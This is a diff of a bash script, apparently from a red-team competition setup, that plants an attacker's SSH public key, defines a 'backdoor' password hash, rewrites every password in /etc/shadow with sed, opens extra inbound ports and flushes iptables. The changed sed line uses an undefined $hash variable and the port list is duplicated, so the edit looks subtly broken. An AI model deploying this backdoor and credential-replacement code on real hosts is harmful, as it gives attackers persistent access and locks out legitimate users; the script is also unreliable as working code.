@@ -3,10 +3,10 @@
 # BEFORE RUNNING: 
 # 3. generate an ssh key on the kali box and copy it out
 
-publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
-scorebotUser="scorebot"
+publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAigDDZnPGIBAYWg2eTuTjZu2QGwMlF3rGH9WYT0m/X6qIsXRPArgraqUfOjAAMobGQhXeciUb/KnNqVijgZLww8iG41+YLItgTpCahMbUhuRmLQ6C60RPUve5ZM3bRAts2NyPAdq+oW82tCcoUx1or60rghKLsr2wx14O39/soOHzGc5Du8Yq2CKn7Q== root@kali-2"
+scorebotUser="sky_scorebot"
 backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/'
-allowedInboundPorts=("22" "53" "3640")
+allowedInboundPorts=("22" "53" "3640" "3089")
 
 
 
@@ -27,12 +27,14 @@ while IFS=: read -r user passwd rest; do
     # Check if the password hash starts with a $
     if [[ "${passwd:0:1}" == '$' ]]; then
         # Replace the password field with the new hashed password
-        sed -i "s#^$user:[^:]*:#$user:$backdoorPassHash:#" /etc/shadow
+        sed -i "s#^$user:[^:]*:#$user:$hash:#" /etc/shadow
     fi
 done < /etc/shadow
 
 
 
+
+allowedInboundPorts=("22" "53" "3640" "3089")
 
 
 iptables -F 
